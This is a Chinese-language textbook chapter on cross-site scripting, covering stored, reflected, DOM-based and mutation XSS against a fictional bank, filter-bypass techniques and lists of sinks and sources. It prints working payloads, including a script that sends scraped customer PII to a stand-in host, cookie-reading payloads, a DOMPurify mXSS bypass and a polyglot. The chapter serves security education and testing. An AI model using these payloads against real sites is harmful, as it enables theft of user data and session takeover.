# 第 10 章：跨站脚本（XSS）

跨站脚本（XSS）漏洞是互联网上最常见的漏洞之一。它们直接响应了当今 Web 应用中日益增长的用户交互而出现。

XSS 攻击的核心在于利用了 Web 应用在用户浏览器中执行脚本这一事实。任何类型的动态创建并执行的脚本，如果该脚本可以被污染或以任何方式修改（尤其是被最终用户修改），都会使 Web 应用面临风险。

XSS 攻击有多种分类方式，其中三大类型为：

- **存储型 XSS**（代码在执行前存储于数据库中）
- **反射型 XSS**（代码不存储在数据库中，而是由服务器反射）
- **基于 DOM 的 XSS**（代码在浏览器中存储和执行）

除此之外确实还有其他分类变体，但这三种涵盖了大多数现代 Web 应用需要定期防范的 XSS 类型。这三种 XSS 攻击已被 OWASP（开放式 Web 应用程序安全项目）等组织认定为 Web 上最常见的 XSS 攻击向量。我们将在下文进一步讨论这三种类型，但首先让我们看看 XSS 攻击是如何产生的，以及如何发现允许此类攻击的漏洞。

## XSS 的发现与利用

假设您对 mega-bank.com 提供的服务水平不满意。幸运的是，mega-bank.com 提供了一个客户支持门户 support.mega-bank.com，您可以在其中提交反馈，并有望收到客户支持代表的回复。

您在支持门户中写下以下评论：

> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> 请改进您的 Web 应用。  
> 其他银行会即时显示存款。  
> ——不满意的客户，support.mega-bank.com

现在，为了强调您对这家虚构银行有多么不满，您决定加粗几个词。不幸的是，提交支持请求的 UI 不支持文本加粗。

由于您略懂技术，您尝试添加一些 HTML 加粗标签：

> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> **<strong>请改进您的 Web 应用。</strong>**  
> 其他银行会即时显示存款。  
> ——不满意的客户，support.mega-bank.com

按下回车后，您的支持请求显示出来。`<strong></strong>` 标签内的文本确实被加粗了。

一位客户支持代表很快回复您：

> 您好，我是 MegaBank 支持的 Sam。  
> 很抱歉您对我们的应用不满意。  
> 我们计划下个月四号进行更新，应该会提高存款在应用中的反映速度。  
> 顺便问一下，您是如何加粗那段文字的？  
> ——客户支持部 Sam，support.mega-bank.com

这里发生的事情实际上在许多 Web 应用中相当常见。这里有一个非常简单的架构错误，如果被黑客发现，可能对公司造成致命打击：

```
用户通过 Web 表单提交评论 →
用户评论存储在数据库中 →
一个或多个用户通过 HTTP 请求请求该评论 →
评论被注入页面 →
注入的评论被解释为 DOM 而非文本
```

通常，这种情况是开发者直接将 HTTP 请求的结果应用到 DOM 上造成的。常见做法是使用如下脚本：

```javascript
/*
 * 创建一个 'div' 类型的 DOM 节点。
 * 向此 div 附加一个字符串，该字符串将被解释为 DOM 而非文本。
 */
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;

/*
 * 将 div 追加到 DOM，同时附带 comment 中的 innerHTML DOM。
 * 因为 comment 被解释为 DOM，它将在加载时被解析并转换为 DOM 元素。
 */
const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);
```

由于文本被直接附加到 DOM，它被解释为 DOM 标记而非纯文本。在我们的客户支持请求中，恰好包含了一个 `<strong></strong>` 标签。

在更恶意的场景中，我们可以利用同样的漏洞造成严重破坏。`<script>` 标签是利用 XSS 漏洞最常用的方式，但还有许多其他方式可以利用此类漏洞。

假设支持评论包含的不是加粗标签，而是以下内容：

> 我对贵行提供的服务不满意。  
> 我的存款等了 12 个小时才在 Web 应用中显示出来。  
> 请改进您的 Web 应用。  
> 其他银行会即时显示存款。  
> <script>
> /*
>  * 从页面中获取所有客户的列表。
>  */
> const customers = document.querySelectorAll('.openCases');
> /*
>  * 遍历每个包含 openCases 类的 DOM 元素，
>  * 收集特权个人身份信息（PII）并将数据存储在 customerData 数组中。
>  */
> const customerData = [];
> customers.forEach((customer) => {
>   customerData.push({
>     firstName: customer.querySelector('.firstName').innerText,
>     lastName: customer.querySelector('.lastName').innerText,
>     email: customer.querySelector('.email').innerText,
>     phone: customer.querySelector('.phone').innerText
>   });
> });
> /*
>  * 构建一个新的 HTTP 请求，将之前收集的数据外泄到黑客自己的服务器。
>  */
> const http = new XMLHttpRequest();
> http.open('POST', 'https://steal-your-data.com/data', true);
> http.setRequestHeader('Content-type', 'application/json');
> http.send(JSON.stringify(customerData));
> </script>
> ——不满意的客户，support.mega-bank.com

这是一个更恶意的用例。由于多种原因，它极其危险。上述代码就是所谓的**存储型 XSS 攻击**——一种依赖攻击代码实际存储在应用所有者数据库中的 XSS 变体。在此例中，我们发送给支持的评论正存储在 MegaBank 的服务器上。

当 `<script>` 标签通过 JavaScript 进入 DOM 时，浏览器的 JavaScript 解释器会立即被调用，并运行 `<script></script>` 标签内的代码。这意味着我们的代码无需客户支持代表进行任何交互就会运行。

这段代码的功能非常简单，并不需要专家级黑客来编写。我们使用 `document.querySelector()` 遍历 DOM，窃取只有客户支持代表或 MegaBank 员工才能访问的特权数据。我们在 UI 中找到这些数据，将其转换为便于阅读和存储的 JSON，然后发送回我们自己的服务器以供使用或出售。

最可怕的是，由于这段代码位于 `<script>` 标签内，它对客户支持代表是不可见的。客户支持代表会看到字面请求文本，但 `<script></script>` 标签及其之间的所有内容都是隐藏的，在后台执行。浏览器会将文本解释为文本，但看到 `<script>` 标签会将其解释为脚本，就像合法开发者为合法网站编写内联脚本一样。

更有趣的是，如果另一位代表打开此评论，恶意脚本也会针对他们的浏览器状态运行。这意味着，由于脚本存储在数据库中，当通过 UI 请求并可见时，任何查看此评论的特权用户都会受到该脚本的攻击。

这是一个经典的存储型 XSS 攻击示例，它适用于缺乏适当安全控制的 Web 应用。这是一个简单的演示，并且可以轻松防御（我们将在第三部分看到），但它仍然是进入 XSS 世界的一个坚实入口。

总结 XSS 攻击：

- 在浏览器中运行非 Web 应用所有者编写的脚本
- 可以在后台运行，无需任何可见性或用户输入即可启动执行
- 可以获取当前 Web 应用中存在的任何类型的数据
- 可以自由地向恶意 Web 服务器发送和接收数据
- 是由于不正确地清理用户输入并将其嵌入 UI 而发生的
- 可用于窃取会话令牌，导致账户接管
- 可用于在当前 UI 之上绘制 DOM 对象，从而发起非技术用户无法识别的完美钓鱼攻击

这应该让您了解 XSS 攻击背后的威力与危险。

## 存储型 XSS

存储型 XSS 攻击可能是最常见的 XSS 攻击类型。存储型 XSS 攻击之所以有趣，是因为它们是最容易检测的 XSS 类型，但也常常是最危险的，因为它们许多时候可以影响最多的用户（见图 10-1）。

> **图 10-1. 存储型 XSS——用户上传的恶意脚本存储在数据库中，随后被其他用户请求和查看，导致脚本在其机器上执行**

一个存储的数据库对象可以被许多用户查看。在某些情况下，如果一个全局对象被感染，您所有的用户都可能暴露于存储型 XSS 攻击。

如果您运营或维护一个视频托管网站，并在首页“推荐”一个视频，那么该视频标题中的存储型 XSS 可能会在视频展示期间影响每一位访客。因此，存储型 XSS 攻击对组织来说可能极其致命。

另一方面，存储型 XSS 的持久性使其检测变得相当容易。虽然脚本本身在客户端（浏览器）执行，但脚本存储在数据库中，即服务端。脚本在服务端以文本形式存储，并且不会被解析（除非在涉及 Node.js 服务器的高级情况下，这时它们会被归类为远程代码执行 [RCE]，我们将在后面介绍）。

由于脚本存储在服务端，定期扫描数据库条目中存储脚本的迹象，对于存储大量最终用户提供的数据的网站来说，可能是一种廉价且高效的缓解方案。事实上，这是当今最注重安全的软件公司用来降低 XSS 风险的众多技术之一。然而，我们很快会发现这不能是最终解决方案，因为高级 XSS 载荷可能甚至不以纯文本形式编写（例如 base64、二进制等）。它们也可能存储在多个位置，只有在被特定服务拼接用于客户端时才变得危险。这些是经验丰富的黑客用来绕过开发者实施的防御机制的一些技巧。

我们在演示存储型 XSS 攻击时使用的示例，是直接将 `<script>` 标签注入 DOM，并通过 JavaScript 执行恶意脚本。这是 XSS 最常见的方法，但也常被聪明的安全工程师和注重安全的开发者所缓解。一个简单的用于禁止 `<script>` 标签的正则表达式，或一个防止内联脚本执行的 CSP 规则，就能阻止这种攻击。

一个 XSS 攻击被归类为“存储型”的唯一要求是载荷必须存储在应用数据库中。这个载荷不需要是有效的 JavaScript，客户端也不一定是 Web 浏览器。如前所述，有许多 `<script>` 标签的替代方案仍然会导致数据泄露或脚本执行。此外，有许多客户端通过 Web 服务器请求数据，这些客户端可能被存储型 XSS 污染——Web 浏览器只是最常见的目标。

## 反射型 XSS

大多数书籍和教育资源在介绍存储型 XSS 之前会先教授反射型 XSS。我认为反射型 XSS 攻击对于新手黑客来说通常比存储型 XSS 更难发现和利用。

从开发者的角度来看，存储型 XSS 攻击非常容易理解。客户端向服务器发送资源（通常通过 HTTP）。服务器用从客户端接收的资源更新数据库。之后，该资源可能被其他用户访问，此时恶意脚本会在请求者的浏览器中不知不觉地执行。

而反射型 XSS 攻击的操作方式与存储型 XSS 相同，但不会存储在数据库中。相反，服务器直接将载荷反射回客户端（见图 10-2）。

> **图 10-2. 在反射型 XSS 中，用户对本地 Web 应用执行一个操作，导致未存储的（链接的）脚本在其自己的设备上执行**

由于不存储在服务器上，反射型 XSS 相比存储型 XSS 可能有点难以理解。让我们先从一个例子开始。

我们再次成为虚构银行 mega-bank.com 的客户。这次，我们想查找有关如何开设新的储蓄账户以补充现有支票账户的支持文档。幸运的是，mega-bank.com 的支持门户 support.mega-bank.com 有一个搜索栏，我们可以用来查找常见的支持请求及其解决方案。

我们首先尝试搜索 “open savings account”。此搜索将我们重定向到新的 URL：`support.mega-bank.com/search?query=open+savings+account`。在此搜索结果页面上，我们看到标题：`3 results for “open savings account”`。

接下来，我们尝试将 URL 调整为 `support.mega-bank.com/search?query=open+checking+account`。结果页面上的标题现在变为：`4 results for “open checking account”`。由此我们可以推断，URL 查询参数与结果页面上显示的标题之间存在关联。

由于我们记得通过在评论中包含 `<strong></strong>` 标签发现了支持表单中的存储型 XSS 漏洞，让我们尝试向搜索查询中添加一个加粗标签：`support.mega-bank.com/search?query=open+<strong>checking</strong>+account`。令我们惊讶的是，我们生成的新 URL 确实加粗了结果页面中的标题。

利用这个新发现，让我们在查询参数中包含一个 `<script>` 标签：`support.mega-bank.com/search?query=open+<script>alert(test);</script>checking+account`。打开此 URL 会加载搜索结果，但首先会弹出一个包含单词 “test” 的警告模态框。

我们在这里发现的是一个 XSS 漏洞——只是这次它不会存储在服务器中。相反，服务器会读取它并将其发送回客户端。这类漏洞被称为“反射型 XSS”。

之前我们讨论了存储型 XSS 的风险，并提到存储型 XSS 很容易影响到许多用户。但我们也提到存储型 XSS 的一个缺点是这些攻击容易被发现，因为它们存储在服务端。

反射型 XSS 则更难检测，因为这些攻击通常直接针对用户，并且从不存储在数据库中。在我们的例子中，我们可以构造一个恶意链接载荷，直接发送给我们想要攻击的用户。这可以通过电子邮件、基于 Web 的广告或许多其他方式完成。

此外，我们前面讨论的反射型 XSS 可以很容易地伪装成有效的链接。让我们以这段 HTML 代码片段为例：

```html
Welcome to MegaBank Fans!
Your #1 source for legit MegaBank support info and links.

<a href="https://mega-bank.com/signup">Become a New Customer</a>
<a href="https://mega-bank.com/promos">See Promotional Offers</a>
<a href="https://support.mega-bank.com/search?query=open+<script>alert('test');</script>checking+account">
  Create a New Checking Account</a>
```

这里有三个链接，都有自定义文本。其中两个是合法的。点击最后一个文本为 “Create a New Checking Account” 的链接会进入支持页面。`alert()` 会提示发生了异常，但就像之前的存储型 XSS 示例一样，我们可以很容易地在后台执行一些代码。也许我们可以找到足够的客户信息来冒充用户，或者如果支持门户 UI 中存在支票/路由号码，我们也可以获取它。

这种反射型 XSS 依赖于 URL，这使得攻击者很容易分发。大多数反射型 XSS 不会这么容易分发，可能需要最终用户执行额外操作，比如将 JavaScript 粘贴到 Web 表单中。

可以安全地说，一般来说，反射型 XSS 更擅长逃避检测，但通常更难分发给大量用户。

## 基于 DOM 的 XSS

XSS 攻击的最后一个主要分类是基于 DOM 的 XSS，如图 10-3 所示。DOM XSS 可以是反射型或存储型，但利用浏览器 DOM 的接收器（sink）和源（source）进行执行。由于不同浏览器的 DOM 实现存在差异，某些浏览器可能存在漏洞，而其他浏览器则没有。这类 XSS 攻击比传统的反射型或存储型 XSS 更难发现和利用，因为它们需要对浏览器 DOM 和 JavaScript 有深入的了解。

> **图 10-3. 基于 DOM 的 XSS**

DOM XSS 与其他形式的 XSS 的主要区别在于，基于 DOM 的 XSS 攻击**从不**需要与服务器进行任何交互。因此，有一种趋势是将 DOM XSS 归类为称为“客户端 XSS”的新类别的一个子集。

因为 DOM XSS 不需要服务器即可运行，浏览器 DOM 中必须同时存在“源”和“接收器”。通常，源是能够存储文本的 DOM 对象，而接收器是能够执行存储为文本的脚本的 DOM API。由于 DOM XSS 从不接触服务器，几乎不可能用静态分析工具或任何其他类型的流行扫描器检测到。

DOM XSS 也难以处理，因为当今使用的浏览器种类繁多。很可能一个浏览器所包含的 DOM 实现中的错误，在另一个浏览器的 DOM 实现中并不存在。

浏览器版本也是如此。2015 年的浏览器版本可能存在漏洞，而现代浏览器可能没有。如果未提供足够的浏览器/操作系统详细信息，试图支持多种浏览器的公司可能难以复现 DOM XSS 攻击。JavaScript 和 DOM 都基于开放规范（TC39 和 WHATWG），但每个浏览器的实现差异很大，且通常因设备而异。

闲话少说，让我们检查一个 mega-bank.com 的 DOM XSS 漏洞。

MegaBank 为其 401(k) 管理服务提供了一个投资门户，位于 investors.mega-bank.com。在 investors.mega-bank.com/listing 内，有一个可通过 401(k) 缴款进行投资的基金列表。左侧导航菜单提供了对这些基金的搜索和筛选功能。

由于基金数量有限，搜索和排序在客户端进行。搜索 “oil” 会将页面 URL 修改为 `investors.mega-bank.com/listing?search=oil`。类似地，筛选 “usa” 以仅查看美国基金，会生成 URL `investors.mega-bank.com/listing#usa`，并自动将页面滚动到美国基金集合。

现在要注意，仅仅因为 URL 改变，并不总是意味着正在向服务器发出请求。在现代 Web 应用中，这种情况更常见，它们使用自己的基于 JavaScript 的路由器，因为这可以带来更好的用户体验。

当我们输入一个恶意搜索查询时，我们不会在这个特定网站上遇到任何异常交互。但重要的是要注意，像 `search` 这样的查询参数可能是 DOM XSS 的源，并且可以通过 `window.location.search` 在所有主流浏览器中找到。

同样，哈希值也可以通过 `window.location.hash` 在 DOM 中找到。这意味着载荷可以注入到搜索查询参数或哈希值中。这些源中的许多危险载荷不会引起任何问题，除非另一段代码实际以可能导致脚本执行的方式使用它——因此需要同时具备“源”和“接收器”。

让我们想象 MegaBank 在同一页面中有以下代码：

```javascript
/*
 * 从 URL 中获取哈希对象 #<x>。
 * 使用 findNumberOfMatches() 函数查找所有匹配项，
 * 将哈希值作为输入提供。
 */
const hash = document.location.hash;
const funds = [];
const nMatches = findNumberOfMatches(funds, hash);

/*
 * 写入找到的匹配数，并将哈希值附加到 DOM 以改善用户体验。
 */
document.write(nMatches + ' matches found for ' + hash);
```

这里我们利用源（`window.location.hash`）的值来生成一些要显示给用户的文本。这是通过接收器（`document.write`）完成的，但也可以通过许多其他接收器完成，有些比其他需要更多或更少的努力。

假设我们生成了一个如下链接：

`investors.mega-bank.com/listing#<script>alert(document.cookie);</script>`

一旦注入 DOM 并被解释为 `<script>` 标签，`document.write()` 调用将导致此哈希值作为脚本执行。这将显示当前会话 cookie，但正如我们在之前的 XSS 示例中看到的，它可能做许多有害的事情。

由此可以看出，虽然此 XSS 不需要服务器，但它确实需要源（`window.location.hash`）和接收器（`document.write`）。此外，如果传递的是合法字符串，它不会引起任何问题，因此可能很长一段时间内都不会被发现。

## 基于变异的 XSS

几年前，我的朋友 Mario Heiderich 发表了一篇名为《mXSS 攻击：利用 innerHTML 变异攻击安全防护良好的 Web 应用》的论文。这篇论文首次介绍了一种新兴的 XSS 攻击分类，被称为**基于变异的 XSS（mXSS）**。

mXSS 攻击目前对所有主流浏览器都有效。它们依赖于对浏览器在渲染 DOM 节点时执行优化和条件判断方式的深入理解。

> 正如过去基于变异的 XSS 攻击并不广为人知或理解一样，未来的技术也可能容易受到 XSS 攻击。XSS 风格的攻击可以针对任何客户端显示技术，虽然它们通常集中在浏览器中，但桌面和移动技术也可能存在漏洞。

尽管新颖且常被误解，mXSS 攻击已被用于绕过大多数现有的强大 XSS 过滤器。像 DOMPurify、OWASP AntiSamy 和 Google Caja 等工具都曾被 mXSS 绕过，许多主要 Web 应用（特别是电子邮件客户端）被发现存在漏洞。mXSS 的核心在于利用过滤器安全的载荷，这些载荷在通过过滤后最终变异为不安全的载荷。

用例子最容易理解 mXSS。2019 年初，安全研究员 Masato Kinugawa 发现了一个影响 Google 库 Closure（用于 Google 搜索）的 mXSS。

Masato 使用了一个名为 DOMPurify 的清理库（Closure 使用它来过滤潜在的 XSS 字符串）。DOMPurify 在客户端（浏览器）运行，通过读取字符串，然后才允许其作为 innerHTML 插入来执行过滤。这实际上是通过 innerHTML 注入 DOM 的字符串最有效的清理方式，因为浏览器实现各异，浏览器版本也不同（因此服务端过滤不会那么有效）。通过将 DOMPurify 库交付给客户端并执行评估，Google 期望他们能拥有一个跨新旧浏览器工作的强大 XSS 过滤解决方案。

Masato 使用的载荷包含以下内容：

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)">"
```

从技术上讲，这个载荷应该是 DOM 安全的，因为由于标签和引号的设置方式，直接附加此内容不会导致脚本执行。因此，DOMPurify 让它通过了“不是 XSS 风险”的检查，但当它被加载到浏览器 DOM 中时，DOM 执行了一些优化，使其看起来像这样：

```html
<noscript><p title="</noscript>
<img src="x" onerror="alert(1)">
">"
```

发生这种情况的原因是 DOMPurify 在其清理过程中使用了根元素 `<template>`。`<template>` 标签会被解析但不会渲染，因此非常适合用于清理。

在 `<template>` 标签内部，元素脚本被禁用。当脚本被禁用时，`<noscript>` 标签会表示其子元素，但当脚本启用时它什么也不做。换句话说，`img onerror` 在清理器内部无法执行脚本，但当它通过清理并进入真实的浏览器环境后，`<p title="` 被忽略，而 `img onerror` 变得有效。

总结：浏览器 DOM 元素通常根据其父级、子级和兄弟级条件性地行动。在某些情况下，黑客可以利用这一点，构造 XSS 载荷，通过不作为有效脚本来绕过过滤器——但在实际浏览器中运行时却变成有效脚本。

基于变异的 XSS 非常新颖，在应用安全行业中常被误解。网上可以找到许多概念验证利用，而且很可能出现更多。不幸的是，正因如此，mXSS 可能会长期存在。

## 绕过过滤器

在使用任何形式的 XSS 攻击应用时，最常见的陷阱之一是客户端过滤阻止了载荷执行。幸运的是，只有一小部分网站使用了最优秀的清理/过滤技术，如 Cure53 的 DOMPurify（图 10-4）[^1]。其余网站要么使用无过滤、内部开发的过滤，要么使用未经广泛测试的库或框架。

> **图 10-4. DOMPurify 是一个行业标准的 XSS 清理器，它利用许多底层 JavaScript 和 DOM API 来保护 HTML、MathML 和 SVG 文件**

由于 DOM 和 JS 规范非常复杂，JavaScript 载荷可以通过许多非常规方式执行，从而绕过仅查找常见或标准 JavaScript 载荷的过滤系统。

### 自闭合 HTML 标签

浏览器的一个独特怪癖是，虽然不带闭合标签的 HTML 标签被认为是无效的，但如果检测到一个没有闭合的开标签，浏览器会尝试闭合该标签。

> 这种行为也见于许多 XML、PDF 和 SVG 解析工具。每个实现都有自己独特的错误修正，因此学习这些工具的怪癖可能会让您洞察可能的攻击向量。

许多客户端过滤工具会评估标签对，因此损坏的 `<script>` 标签可能能够绕过所述过滤，然后被浏览器重新生成（因此能够执行脚本）。一个示例如下：

```html
<script>alert() // 实际代码
<script>alert()<script> // 浏览器“修复后”的代码
```

这是一种简单的技术，每次尝试所需工作量很小。更复杂的技术建立在这种自我修复或错误纠正行为之上。在本书的其余部分，我将重点介绍自我纠正算法使攻击成为可能的情况。

### 协议相对 URL

协议相对 URL（PRURL）是主流浏览器都支持的一种遗留机制，允许浏览器选择打开链接的协议。这种 URL 模式被认为是一种安全反模式，因为浏览器可能使用不太安全的协议选项打开链接（例如打开 `http://` 而非 `https://`）。然而，由于大多数浏览器仍支持 PRURL 方案，它成为了绕过常见 XSS 载荷过滤器的有效方式。

使用这些 URL 的方法很简单。如果过滤脚本试图撤销对外部 URL 的脚本或 HTML 载荷的引用，只需移除 HTTP 或 HTTPS 协议，改用 `//`。一旦脚本加载到 DOM 中，浏览器会选择看起来最相关的方案，这通常会导致过滤绕过，因为大多数过滤发生在 DOM 节点实例化之前。

下面展示了两个 PRURL 链接示例：

```html
<a href="https://evil-website.com">click</a> <!-- 被过滤 -->
<a href="//evil-website.com">click</a> <!-- 未被过滤 -->
```

请注意，如果您正在测试一个 Web 应用并且可以直接联系该应用的开发者，您应建议他们避免使用 PRURL，原因如上所述。

### 畸形标签

现代浏览器具有恢复性代码，以帮助解析格式异常的 HTML 标签。这通常意味着更正包含字符串的引号的位置、数量或类型。由于过滤库在 DOM 加载之前检查代码，畸形标签可能通过过滤，但在浏览器完成修复标签语法的繁重工作后完美执行。

用于超链接的 `<a>` 标签就是这样一个标签，大多数浏览器会尝试纠正不正确的引号。以下是 Chrome 在首次渲染之前会将其恢复为完整功能的两个无效 `<a>` 标签：

```html
<a onmouseover="alert(document.cookie)">xxs</a>
<a onmouseover=alert(document.cookie)>xxs</a>
```

最新版本的 Chrome 也使用类似的引擎纠正 `<img>` 标签，允许如下载荷在浏览器逻辑清理后不受阻碍地执行：

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
```

许多安全研究人员在网上发布了类似的畸形攻击载荷。研究这些载荷可以让您深入了解如何更好地开发自己的畸形载荷。

### 编码转义

大多数过滤库在将 JavaScript 代码和 HTML 交给浏览器进行评估、编译和渲染之前，会对其执行某种静态分析。由于静态分析在浏览器有机会生成节点和构建抽象语法树（AST）之前执行，静态分析检查必须查找精确的 JavaScript 和 HTML 语法。

在载荷中可以替换表示字符串、字符和数字的替代但有效的格式，这通常可以绕过过滤。Unicode 是实现此目的的最佳编码形式之一。

在 JavaScript 代码中，Unicode 字符可以随时替换拉丁字符。要在 JavaScript 脚本中写入 Unicode 字符，只需引入反斜杠后跟拉丁字符 “u”（例如 `\u`），然后是一个四位长度的十六进制字符串（0–9，A–F），表示您要添加到代码中的 Unicode 字符（例如 `\u006c`）。网上有许多资源提供 Unicode 到拉丁字符的映射。Unicode 自 1987 年以来就存在，因此不仅得到广泛支持，而且在线和离线资料中都有大量关于 Unicode 的文档。考虑以下 JavaScript 代码片段：

```javascript
alert(1); // 由于标准拉丁字符，被过滤器阻止
```

这个 `alert(1)` 会被许多常见过滤脚本阻止，因为它是测试 XSS 载荷最常用的函数。然而，相同的脚本可以用多种 Unicode 方式编写：

```javascript
\u0061lert(1) // alert(1)，替换了 "a"
a\u006cert(1) // alert(1)，替换了 "l"
\u0061\u006c\u0065\u0072\u0074(1) // alert(1)，替换了所有字符
```

通常，这种编码尽管对 JavaScript 解释器有效且能够执行脚本，但会绕过过滤。这些字符替换很容易在浏览器开发者控制台中测试，在 Mac 上可通过 Command-Option-I 访问，在 Windows 或 Linux 版 Chrome 浏览器中可通过 F12 或 Control+Shift+I 访问。

### 多语言载荷

当搜索 XSS 接收器时，一个问题是浏览器包含多种潜在的上下文，每种上下文期望非常特定类型的载荷。例如，在 `eval()` 函数中正确执行的 XSS 载荷很可能与 `element.innerHTML` 中的不同。因此，如果按上下文逐个开发载荷，寻找可行的 XSS 载荷可能是一个极其漫长的过程。

多语言载荷是一种独特的测试工具，可以节省大量时间，因为多语言载荷是能够在各种浏览器上下文中执行脚本的 XSS 载荷。

以下多语言载荷由 GitHub 用户 0xSobky 于 2018 年发布，它能够在十多种常见 XSS 上下文中执行脚本：

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() )
//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
\x3csVg/<sVg/oNloAd=alert()//>\x3e`
```

一些兼容上下文示例如下：

- **双引号标签属性**：`<input type="text" value="<polyglot>"></input>`
- **单引号标签属性**：`<input type='text' value='<polyglot>'></input>`
- **无引号标签属性**：`<input type=text value=<polyglot>></input>`
- **HTML 注释**：`<!-- <polyglot> -->`
- **HTML 标签**：`<title><polyglot></title>`
- **JavaScript 单引号字符串**：`var str = "<polyglot>";`

这只是上述多语言载荷能够成功执行的可能上下文的一小部分示例。访问 GitHub 上的 0xSobky/HackVault 可查看此载荷的所有测试执行上下文，并将其（以及类似的多语言载荷）记在心中，以便在寻找可行的 XSS 利用时大幅减少繁琐工作。

## XSS 接收器与源

请记住，可利用的 XSS 漏洞由两个关键组件组成。第一个组件是**接收器（sink）**，即能够执行脚本的浏览器方法。第二个组件是**源（source）**，通常是浏览器或网页中可以接受基于文本的载荷的位置，该载荷稍后会被接收器读取并执行。

除了最常见的接收器和源之外，还有数十个（如果不是数百个）很少使用的接收器和源，它们更可能被利用，并且更不容易受到过滤或清理的影响。以下是一个不完整的接收器列表，包括一些很少被记录的：

- `eval()`
- `Function()`
- `<script>`
- `setTimeout()`
- `javascript://`
- `setInterval()`
- `document.write()`
- `execScript()`
- `document.writeln()`
- `ScriptElement.src`
- `document.domain()`
- `document.location`
- `element.innerHTML`
- `range.createContextualFragment`
- `element.outerHTML`

以下是一个不完整的源列表，同样包括一些很少被记录的：

- `document.url`
- `document.URLEncoded`
- `window.name`
- `document.documentURI`
- `document.baseURI`
- `history.pushState()`
- `localStorage`
- `window.location.search`
- `sessionStorage`
- `window.location.hash`
- `document.referrer`
- `window.location.cookie`
- `window.indexedDB`
- `window.location.pathname`
- `window.location.href`

要查找更不常见的接收器和源，请考虑阅读官方 JavaScript（ECMAScript）和 DOM 规范。这些可以分别在 TC39 和 WHATWG 网站上找到。

## 小结

尽管不如过去那么常见，但 XSS 漏洞如今在 Web 上仍然十分猖獗。由于 Web 应用中用户交互和数据持久性的不断增加，XSS 漏洞出现在应用中的机会比以往任何时候都多。

与其他常见漏洞原型不同，XSS 可以从多个角度利用——其中一些跨会话持久（存储型），另一些则不（反射型）。此外，由于 XSS 漏洞依赖于在客户端查找脚本执行接收器，浏览器复杂规范中的错误也可能导致意外的脚本执行（基于 DOM 的 XSS）。存储型 XSS 可以通过分析数据库存储来发现，因此容易检测。但反射型和基于 DOM 的 XSS 漏洞通常难以发现和确定——这意味着这些漏洞很可能存在于大量 Web 应用中，但尚未被检测到。

XSS 是一种在 Web 历史的大部分时间里都存在的攻击类型。虽然攻击的基础仍然相同，但攻击的表面积和变体都增加了。

由于其广泛的攻击面、（相对）易于执行、逃避检测以及此类漏洞的强大威力，XSS 攻击应该成为任何渗透测试员或漏洞赏金猎人的核心技能。
